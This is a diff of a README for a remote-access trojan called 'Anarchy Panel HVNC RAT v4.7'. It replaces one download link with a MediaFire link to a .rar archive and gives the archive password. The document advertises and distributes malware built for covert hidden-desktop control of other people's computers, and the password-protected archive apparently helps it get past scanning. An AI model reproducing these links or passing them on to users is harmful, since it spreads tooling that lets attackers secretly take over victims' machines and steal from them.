@@ -1,5 +1,5 @@
 # Anarchy-Rat-Reloaded
-[Click Here To Download](https://rdmfile.eu/install/xe78ghvs7Hxv)
+[Click Here To Download](https://www.mediafire.com/file/bzg164ld8ahhtzf/Anarchy.rar/file)
 [Password: S0f4fr33!]
 
 # Anarchy Panel HVNC RAT v4.7
